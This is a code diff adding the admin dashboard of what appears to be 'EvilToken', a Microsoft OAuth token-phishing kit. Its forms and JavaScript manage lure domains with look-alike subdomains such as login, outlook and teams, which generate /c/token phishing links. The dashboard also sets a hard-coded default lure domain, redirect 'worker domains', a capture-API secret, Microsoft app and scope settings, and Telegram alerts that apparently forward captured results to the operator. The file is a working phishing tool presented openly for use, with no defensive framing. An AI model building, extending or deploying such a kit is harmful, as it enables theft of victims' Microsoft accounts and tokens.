+        <div style="display: flex; gap: 16px; margin-bottom: 16px; align-items: center; flex-wrap: wrap;">
+            <div style="display: flex; align-items: center; gap: 8px;">
+                <label style="font-weight: 500;">Enable Notifications</label>
+                <input type="checkbox" id="telegramEnabled" checked>
+            </div>
+            <div id="telegramStatus" style="font-size: 13px; color: var(--text-muted);">
+                Status: <span id="telegramStatusText">Loading...</span>
+            </div>
+        </div>
+
+        <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+            <button type="submit" class="btn btn-primary" style="padding: 10px 24px; border-radius: 6px; background: #00bcd4; color: white; border: none; cursor: pointer; font-weight: 600;">
+                <i class="fas fa-save"></i> Save Settings
+            </button>
+            <button type="button" class="btn btn-success" onclick="testTelegram()" style="padding: 10px 24px; border-radius: 6px; background: #4caf50; color: white; border: none; cursor: pointer; font-weight: 600;">
+                <i class="fas fa-paper-plane"></i> Send Test Message
+            </button>
+        </div>
+
+        <div id="telegramUpdateStatus" style="margin-top: 12px;"></div>
+    </form>
+</div>
+
+<!-- ============================================================
+ALLOWED_HOSTS MANAGEMENT
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #e91e63; margin-top: 24px; border-radius: 12px; padding: 20px;">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-bottom: 16px;">
+        <h3 style="margin: 0;"><i class="fas fa-shield-alt" style="color: #e91e63;"></i> 🔐 Admin Access Control</h3>
+        <span style="font-size: 12px; padding: 4px 12px; border-radius: 12px; background: rgba(233, 30, 99, 0.15); color: #e91e63;">
+            <i class="fas fa-check-circle"></i> Manage allowed hosts
+        </span>
+    </div>
+
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        Control which domains/IPs can access the admin panel. Add your RDP IP, new domains, or subdomains here.
+    </p>
+
+    <div style="display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap;">
+        <input type="text" id="newAllowedHost" placeholder="e.g., rdp.yourdomain.com or 192.168.1.100" 
+               style="flex: 1; min-width: 200px; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
+        <button onclick="addAllowedHost()" class="btn btn-success" style="padding: 10px 24px; background: #4caf50; color: white; border: none; border-radius: 6px; cursor: pointer;">
+            <i class="fas fa-plus"></i> Add
+        </button>
+        <button onclick="refreshAllowedHosts()" class="btn btn-secondary" style="padding: 10px 24px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; cursor: pointer;">
+            <i class="fas fa-sync"></i> Refresh
+        </button>
+    </div>
+
+    <div id="allowedHostsList">
+        <div style="text-align: center; padding: 20px; color: var(--text-muted);">
+            <i class="fas fa-spinner fa-spin"></i> Loading...
+        </div>
+    </div>
+
+    <div id="allowedHostStatus" style="margin-top: 10px;"></div>
+</div>
+
+<!-- ============================================================
+SECRETS & OAUTH SETTINGS
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #ff5722; margin-top: 24px; border-radius: 12px; padding: 20px;">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-bottom: 16px;">
+        <h3 style="margin: 0;"><i class="fas fa-key" style="color: #ff5722;"></i> 🔑 Secrets & OAuth Settings</h3>
+        <span style="font-size: 12px; padding: 4px 12px; border-radius: 12px; background: rgba(255, 87, 34, 0.15); color: #ff5722;">
+            <i class="fas fa-check-circle"></i> Advanced settings
+        </span>
+    </div>
+
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        Configure secrets and OAuth settings for your EvilToken instance. Change these if you want to use a different Microsoft app or update your worker secret.
+    </p>
+
+    <form id="secretsForm" onsubmit="updateSecrets(event)">
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px;">
+            <div>
+                <label style="font-weight: 600; display: block; margin-bottom: 4px;">Worker Secret</label>
+                <input type="text" id="workerSecret" class="form-control" 
+                       placeholder="Worker signing secret"
+                       style="width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary); font-family: monospace;">
+                <small style="color: var(--text-muted);">Used to sign worker redirects</small>
+            </div>
+            <div>
+                <label style="font-weight: 600; display: block; margin-bottom: 4px;">Capture Secret</label>
+                <input type="text" id="captureSecret" class="form-control" 
+                       placeholder="Capture API secret"
+                       style="width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary); font-family: monospace;">
+                <small style="color: var(--text-muted);">Used for /api/capture authentication</small>
+            </div>
+            <div>
+                <label style="font-weight: 600; display: block; margin-bottom: 4px;">OAuth Client ID</label>
+                <input type="text" id="oauthClientId" class="form-control" 
+                       placeholder="Microsoft OAuth Client ID"
+                       style="width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary); font-family: monospace;">
+                <small style="color: var(--text-muted);">Your Microsoft App Registration Client ID</small>
+            </div>
+            <div>
+                <label style="font-weight: 600; display: block; margin-bottom: 4px;">OAuth Tenant ID</label>
+                <input type="text" id="oauthTenantId" class="form-control" 
+                       placeholder="e.g., organizations or your-tenant-id"
+                       style="width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary); font-family: monospace;">
+                <small style="color: var(--text-muted);">Microsoft tenant: 'organizations' or specific tenant ID</small>
+            </div>
+        </div>
+
+        <div style="margin-bottom: 16px;">
+            <label style="font-weight: 600; display: block; margin-bottom: 4px;">OAuth Scopes</label>
+            <input type="text" id="oauthScopes" class="form-control" 
+                   placeholder="User.Read offline_access"
+                   style="width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary); font-family: monospace;">
+            <small style="color: var(--text-muted);">Space-separated OAuth scopes</small>
+        </div>
+
+        <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+            <button type="submit" class="btn btn-primary" style="padding: 10px 24px; border-radius: 6px; background: #ff5722; color: white; border: none; cursor: pointer; font-weight: 600;">
+                <i class="fas fa-save"></i> Save Settings
+            </button>
+            <button type="button" class="btn btn-secondary" onclick="loadSecrets()" style="padding: 10px 24px; border-radius: 6px; background: var(--bg-secondary); border: 1px solid var(--border); cursor: pointer;">
+                <i class="fas fa-sync"></i> Refresh
+            </button>
+        </div>
+
+        <div id="secretsUpdateStatus" style="margin-top: 12px;"></div>
+    </form>
+</div>
+
+<!-- ============================================================
+JAVASCRIPT - ALL UI FUNCTIONALITY
+============================================================ -->
+<script>
+// ============================================================
+// LURE DOMAIN FUNCTIONS
+// ============================================================
+function loadCurrentDomain() {
+    fetch('/api/domain_status')
+        .then(res => res.json())
+        .then(data => {
+            document.getElementById('currentLureDomain').textContent = data.base_url;
+            document.getElementById('newLureDomain').value = data.domain;
+            if (data.subdomains && data.subdomains.length > 0) {
+                document.getElementById('newLureSubdomains').value = data.subdomains.join(', ');
+            }
+            showDomainPreview();
+        })
+        .catch(err => console.log('Domain status load error:', err));
+}
+
+function showDomainPreview() {
+    const domain = document.getElementById('newLureDomain').value.trim();
+    const subdomains = document.getElementById('newLureSubdomains').value.split(',').map(s => s.trim()).filter(s => s);
+    const previewDiv = document.getElementById('domainPreview');
+    if (!previewDiv) return;
+    
+    if (domain && subdomains.length > 0) {
+        previewDiv.style.display = 'block';
+        let html = '';
+        subdomains.slice(0, 3).forEach(s => {
+            html += '<code>https://' + s + '.' + domain + '/c/token</code><br>';
+        });
+        if (subdomains.length > 3) {
+            html += '<span class="text-muted">...and ' + (subdomains.length - 3) + ' more subdomains</span>';
+        }
+        document.getElementById('previewLinks').innerHTML = html;
+    } else {
+        previewDiv.style.display = 'none';
+    }
+}
+
+function updateLureDomain(event) {
+    event.preventDefault();
+    
+    const domain = document.getElementById('newLureDomain').value.trim();
+    const subdomains = document.getElementById('newLureSubdomains').value.split(',').map(s => s.trim()).filter(s => s);
+    
+    if (!domain) {
+        alert('⚠️ Please enter a domain name');
+        return;
+    }
+    
+    if (subdomains.length < 2) {
+        alert('⚠️ Please enter at least 2 subdomains');
+        return;
+    }
+    
+    if (!confirm('⚠️ This will change ALL your lure links to:\n\nhttps://' + subdomains[0] + '.' + domain + '/c/token\nhttps://' + subdomains[1] + '.' + domain + '/c/token\n...and ' + (subdomains.length - 2) + ' more\n\nContinue?')) {
+        return;
+    }
+    
+    const statusDiv = document.getElementById('domainUpdateStatus');
+    statusDiv.innerHTML = '<div style="padding: 10px 16px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); border-left: 3px solid #2196f3; color: #2196f3;">⏳ Updating domain...</div>';
+    
+    fetch('/api/update_domain', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+            domain: domain,
+            subdomains: subdomains 
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) {
+            statusDiv.innerHTML = '<div style="padding: 10px 16px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); border-left: 3px solid #f44336; color: #f44336;">❌ ' + data.error + '</div>';
+        } else {
+            statusDiv.innerHTML = '<div style="padding: 10px 16px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); border-left: 3px solid #4caf50; color: #4caf50;">✅ ' + data.message + '</div>';
+            setTimeout(() => location.reload(), 2000);
+        }
+    })
+    .catch(err => {
+        statusDiv.innerHTML = '<div style="padding: 10px 16px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); border-left: 3px solid #f44336; color: #f44336;">❌ Error: ' + err.message + '</div>';
+    });
+}
+
+function resetToDefaultDomain() {
+    if (confirm('Reset to default domain (dltufurniture.com) and subdomains?')) {
+        document.getElementById('newLureDomain').value = 'dltufurniture.com';
+        document.getElementById('newLureSubdomains').value = 'auth, secure, login, verify, account, portal, office, outlook, help, support, docs, teams';
+        showDomainPreview();
+    }
+}
+
+// ============================================================
+// WORKER DOMAINS FUNCTIONS
+// ============================================================
+function loadWorkerDomains() {
+    const container = document.getElementById('workerDomainsList');
+    fetch('/api/worker_domains')
+        .then(res => res.json())
+        .then(data => {
+            if (data.length === 0) {
+                container.innerHTML = '<div style="text-align: center; padding: 20px; color: var(--text-muted); border: 1px dashed var(--border); border-radius: 8px;">No worker domains configured.</div>';
+                return;
+            }
+            let html = '<div style="border: 1px solid var(--border); border-radius: 8px; overflow: hidden;">';
+            html += '<div style="display: grid; grid-template-columns: 40px 1fr 80px 50px 50px; gap: 10px; padding: 10px 14px; background: var(--bg-secondary); font-weight: 600; font-size: 12px; border-bottom: 1px solid var(--border);"><div>#</div><div>Domain</div><div>Status</div><div></div><div></div></div>';
+            data.forEach((d, index) => {
+                const statusColor = d.enabled === 1 ? '#4caf50' : '#f44336';
+                const statusText = d.enabled === 1 ? 'Active' : 'Inactive';
+                html += '<div style="display: grid; grid-template-columns: 40px 1fr 80px 50px 50px; gap: 10px; padding: 10px 14px; border-bottom: 1px solid var(--border); align-items: center; background: var(--bg-primary);">' +
+                    '<div style="color: var(--text-muted);">' + (index + 1) + '</div>' +
+                    '<div style="word-break: break-all;">' + d.domain + '</div>' +
+                    '<div><span style="display: inline-block; padding: 2px 10px; border-radius: 12px; background: ' + statusColor + '20; color: ' + statusColor + '; font-size: 12px; font-weight: 600;">' + statusText + '</span></div>' +
+                    '<div><button onclick="toggleWorkerDomain(' + d.id + ')" class="btn btn-sm" style="padding: 4px 10px; border-radius: 4px; border: 1px solid var(--border); background: var(--bg-secondary); cursor: pointer; font-size: 12px;"><i class="fas fa-' + (d.enabled === 1 ? 'pause' : 'play') + '"></i></button></div>' +
+                    '<div><button onclick="deleteWorkerDomain(' + d.id + ')" class="btn btn-sm" style="padding: 4px 10px; border-radius: 4px; border: 1px solid #f44336; background: transparent; color: #f44336; cursor: pointer; font-size: 12px;"><i class="fas fa-trash"></i></button></div>' +
+                '</div>';
+            });
+            html += '</div>';
+            container.innerHTML = html;
+        })
+        .catch(err => {
+            container.innerHTML = '<div style="color: #f44336; padding: 10px;">❌ Error loading domains: ' + err.message + '</div>';
+        });
+}
+
+function addWorkerDomain() {
+    const input = document.getElementById('newWorkerDomain');
+    const domain = input.value.trim();
+    const statusDiv = document.getElementById('workerDomainStatus');
+    if (!domain) { alert('⚠️ Please enter a domain'); return; }
+    statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); color: #2196f3;">⏳ Adding...</div>';
+    fetch('/api/worker_domains', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ domain: domain })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ ' + data.error + '</div>';
+        } else {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ ' + data.message + '</div>';
+            input.value = '';
+            loadWorkerDomains();
+        }
+    })
+    .catch(err => {
+        statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ Error: ' + err.message + '</div>';
+    });
+}
+
+function toggleWorkerDomain(id) {
+    fetch('/api/worker_domains/' + id + '/toggle', { method: 'POST' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); }
+            else { loadWorkerDomains();
+            document.getElementById('workerDomainStatus').innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ ' + data.message + '</div>'; }
+        })
+        .catch(err => alert('❌ Error: ' + err.message));
+}
+
+function deleteWorkerDomain(id) {
+    if (!confirm('⚠️ Delete this worker domain?')) { return; }
+    fetch('/api/worker_domains/' + id, { method: 'DELETE' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); }
+            else { loadWorkerDomains();
+            document.getElementById('workerDomainStatus').innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ ' + data.message + '</div>'; }
+        })
+        .catch(err => alert('❌ Error: ' + err.message));
+}
+
+function refreshWorkerDomains() {
+    loadWorkerDomains();
+    document.getElementById('workerDomainStatus').innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); color: #2196f3;">🔄 Refreshed</div>';
+}
+
+// ============================================================
+// TELEGRAM FUNCTIONS
+// ============================================================
+function loadTelegramSettings() {
+    fetch('/api/telegram/settings')
+        .then(res => res.json())
+        .then(data => {
+            document.getElementById('telegramBotToken').value = data.bot_token || '';
+            document.getElementById('telegramChatId').value = data.chat_id || '';
+            document.getElementById('telegramEnabled').checked = data.enabled === 1;
+            const statusText = document.getElementById('telegramStatusText');
+            if (data.bot_token && data.chat_id) {
+                statusText.textContent = '✅ Configured';
+                statusText.style.color = '#4caf50';
+            } else {
+                statusText.textContent = '⚠️ Not configured';
+                statusText.style.color = '#ff9800';
+            }
+        })
+        .catch(err => {
+            document.getElementById('telegramStatusText').textContent = '❌ Error loading';
+        });
+}
+
+function updateTelegram(event) {
+    event.preventDefault();
+    
+    const botToken = document.getElementById('telegramBotToken').value.trim();
+    const chatId = document.getElementById('telegramChatId').value.trim();
+    const enabled = document.getElementById('telegramEnabled').checked;
+    const statusDiv = document.getElementById('telegramUpdateStatus');
+    
+    statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); color: #2196f3;">⏳ Saving...</div>';
+    
+    fetch('/api/telegram/settings', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            bot_token: botToken,
+            chat_id: chatId,
+            enabled: enabled
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ ' + data.error + '</div>';
+        } else {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ ' + data.message + '</div>';
+            loadTelegramSettings();
+        }
+    })
+    .catch(err => {
+        statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ Error: ' + err.message + '</div>';
+    });
+}
+
+function testTelegram() {
+    const botToken = document.getElementById('telegramBotToken').value.trim();
+    const chatId = document.getElementById('telegramChatId').value.trim();
+    const statusDiv = document.getElementById('telegramUpdateStatus');
+    
+    if (!botToken || !chatId) {
+        alert('⚠️ Please enter both Bot Token and Chat ID first.');
+        return;
+    }
+    
+    statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); color: #2196f3;">⏳ Sending test message...</div>';
+    
+    fetch('/api/telegram/test', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            bot_token: botToken,
+            chat_id: chatId
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ ' + data.error + '</div>';
+        } else {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ ' + data.message + '</div>';
+        }
+    })
+    .catch(err => {
+        statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ Error: ' + err.message + '</div>';
+    });
+}
+
+// ============================================================
+// ALLOWED_HOSTS FUNCTIONS
+// ============================================================
+function loadAllowedHosts() {
+    const container = document.getElementById('allowedHostsList');
+    fetch('/api/allowed_hosts')
+        .then(res => res.json())
+        .then(data => {
+            if (data.length === 0) {
+                container.innerHTML = '<div style="text-align: center; padding: 20px; color: var(--text-muted); border: 1px dashed var(--border); border-radius: 8px;">No hosts configured.</div>';
+                return;
+            }
+            let html = '<div style="border: 1px solid var(--border); border-radius: 8px; overflow: hidden;">';
+            html += '<div style="display: grid; grid-template-columns: 40px 1fr 80px 50px 50px; gap: 10px; padding: 10px 14px; background: var(--bg-secondary); font-weight: 600; font-size: 12px; border-bottom: 1px solid var(--border);"><div>#</div><div>Host</div><div>Status</div><div></div><div></div></div>';
+            data.forEach((d, index) => {
+                const statusColor = d.enabled === 1 ? '#4caf50' : '#f44336';
+                const statusText = d.enabled === 1 ? 'Active' : 'Inactive';
+                html += '<div style="display: grid; grid-template-columns: 40px 1fr 80px 50px 50px; gap: 10px; padding: 10px 14px; border-bottom: 1px solid var(--border); align-items: center; background: var(--bg-primary);">' +
+                    '<div style="color: var(--text-muted);">' + (index + 1) + '</div>' +
+                    '<div style="word-break: break-all;">' + d.host + '</div>' +
+                    '<div><span style="display: inline-block; padding: 2px 10px; border-radius: 12px; background: ' + statusColor + '20; color: ' + statusColor + '; font-size: 12px; font-weight: 600;">' + statusText + '</span></div>' +
+                    '<div><button onclick="toggleAllowedHost(' + d.id + ')" class="btn btn-sm" style="padding: 4px 10px; border-radius: 4px; border: 1px solid var(--border); background: var(--bg-secondary); cursor: pointer; font-size: 12px;"><i class="fas fa-' + (d.enabled === 1 ? 'pause' : 'play') + '"></i></button></div>' +
+                    '<div><button onclick="deleteAllowedHost(' + d.id + ')" class="btn btn-sm" style="padding: 4px 10px; border-radius: 4px; border: 1px solid #f44336; background: transparent; color: #f44336; cursor: pointer; font-size: 12px;"><i class="fas fa-trash"></i></button></div>' +
+                '</div>';
+            });
+            html += '</div>';
+            container.innerHTML = html;
+        })
+        .catch(err => {
+            container.innerHTML = '<div style="color: #f44336; padding: 10px;">❌ Error loading hosts: ' + err.message + '</div>';
+        });
+}
+
+function addAllowedHost() {
+    const input = document.getElementById('newAllowedHost');
+    const host = input.value.trim();
+    const statusDiv = document.getElementById('allowedHostStatus');
+    if (!host) { alert('⚠️ Please enter a host'); return; }
+    statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); color: #2196f3;">⏳ Adding...</div>';
+    fetch('/api/allowed_hosts', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ host: host })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ ' + data.error + '</div>';
+        } else {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ ' + data.message + '</div>';
+            input.value = '';
+            loadAllowedHosts();
+        }
+    })
+    .catch(err => {
+        statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ Error: ' + err.message + '</div>';
+    });
+}
+
+function toggleAllowedHost(id) {
+    fetch('/api/allowed_hosts/' + id + '/toggle', { method: 'POST' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); }
+            else { loadAllowedHosts();
+            document.getElementById('allowedHostStatus').innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ ' + data.message + '</div>'; }
+        })
+        .catch(err => alert('❌ Error: ' + err.message));
+}
+
+function deleteAllowedHost(id) {
+    if (!confirm('⚠️ Delete this allowed host?')) { return; }
+    fetch('/api/allowed_hosts/' + id, { method: 'DELETE' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); }
+            else { loadAllowedHosts();
+            document.getElementById('allowedHostStatus').innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ ' + data.message + '</div>'; }
+        })
+        .catch(err => alert('❌ Error: ' + err.message));
+}
+
+function refreshAllowedHosts() {
+    loadAllowedHosts();
+    document.getElementById('allowedHostStatus').innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); color: #2196f3;">🔄 Refreshed</div>';
+}
+
+// ============================================================
+// SECRETS FUNCTIONS
+// ============================================================
+function loadSecrets() {
+    fetch('/api/secrets')
+        .then(res => res.json())
+        .then(data => {
+            document.getElementById('workerSecret').value = data.worker_secret || '';
+            document.getElementById('captureSecret').value = data.capture_secret || '';
+            document.getElementById('oauthClientId').value = data.oauth_client_id || '';
+            document.getElementById('oauthTenantId').value = data.oauth_tenant_id || '';
+            document.getElementById('oauthScopes').value = data.oauth_scopes || '';
+        })
+        .catch(err => {
+            document.getElementById('secretsUpdateStatus').innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ Error loading: ' + err.message + '</div>';
+        });
+}
+
+function updateSecrets(event) {
+    event.preventDefault();
+    
+    const data = {
+        worker_secret: document.getElementById('workerSecret').value.trim(),
+        capture_secret: document.getElementById('captureSecret').value.trim(),
+        oauth_client_id: document.getElementById('oauthClientId').value.trim(),
+        oauth_tenant_id: document.getElementById('oauthTenantId').value.trim(),
+        oauth_scopes: document.getElementById('oauthScopes').value.trim()
+    };
+    
+    const statusDiv = document.getElementById('secretsUpdateStatus');
+    statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); color: #2196f3;">⏳ Saving...</div>';
+    
+    fetch('/api/secrets', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ ' + data.error + '</div>';
+        } else {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ ' + data.message + '</div>';
+        }
+    })
+    .catch(err => {
+        statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ Error: ' + err.message + '</div>';
+    });
+}
+
+// ============================================================
+// SEND TEST EMAIL
+// ============================================================
+function sendTestEmail(event) {
+    event.preventDefault();
+    
+    const email = document.getElementById('testEmail').value.trim();
+    const subject = document.getElementById('testSubject').value.trim() || 'Test Email';
+    const statusDiv = document.getElementById('testEmailStatus');
+    
+    if (!email) {
+        alert('⚠️ Please enter a recipient email');
+        return;
+    }
+    
+    statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(33, 150, 243, 0.1); color: #2196f3;">⏳ Sending test email...</div>';
+    
+    fetch('/test_email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'test_email=' + encodeURIComponent(email) + '&subject=' + encodeURIComponent(subject)
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ ' + data.error + '</div>';
+        } else {
+            statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(76, 175, 80, 0.1); color: #4caf50;">✅ ' + data.message + '</div>';
+        }
+    })
+    .catch(err => {
+        statusDiv.innerHTML = '<div style="padding: 8px 12px; border-radius: 6px; background: rgba(244, 67, 54, 0.1); color: #f44336;">❌ Error: ' + err.message + '</div>';
+    });
+}
+
+// ============================================================
+// INITIALIZE ALL SECTIONS ON PAGE LOAD
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+    loadCurrentDomain();
+    loadWorkerDomains();
+    loadTelegramSettings();
+    loadAllowedHosts();
+    loadSecrets();
+});
+</script>
+
+<style>
+    .glass {
+        background: var(--card-bg);
+        padding: 24px;
+        border-radius: 12px;
+        border: 1px solid var(--border);
+        transition: all 0.3s ease;
+    }
+    .glass:hover {
+        box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+    }
+    .form-group {
+        margin-bottom: 14px;
+    }
+    .form-group label {
+        display: block;
+        font-size: 13px;
+        font-weight: 500;
+        margin-bottom: 4px;
+        color: var(--text-secondary);
+    }
+    .form-control {
+        width: 100%;
+        padding: 8px 12px;
+        border-radius: 6px;
+        border: 1px solid var(--border);
+        background: var(--input-bg);
+        color: var(--text-primary);
+        transition: border-color 0.2s;
+        font-size: 14px;
+    }
+    .form-control:focus {
+        outline: none;
+        border-color: #007bff;
+    }
+    .btn {
+        padding: 8px 16px;
+        border-radius: 6px;
+        border: none;
+        cursor: pointer;
+        font-weight: 500;
+        font-size: 14px;
+        text-decoration: none;
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        transition: all 0.2s;
+    }
+    .btn:hover { opacity: 0.85; }
+    .btn-primary { background: #007bff; color: white; }
+    .btn-success { background: #28a745; color: white; }
+    .btn-danger { background: #dc3545; color: white; }
+    .btn-warning { background: #ff9800; color: white; }
+    .btn-sm { padding: 4px 10px; font-size: 12px; }
+    .table-wrap { overflow-x: auto; margin-top: 8px; }
+    table { width: 100%; border-collapse: collapse; font-size: 14px; }
+    th { text-align: left; padding: 10px 12px; border-bottom: 2px solid var(--border); font-weight: 600; color: var(--text-secondary); font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+    td { padding: 10px 12px; border-bottom: 1px solid var(--border); }
+    tr:hover td { background: var(--bg-secondary); }
+    hr { border: none; border-top: 1px solid var(--border); margin: 16px 0; }
+</style>
+
+{% endblock %}
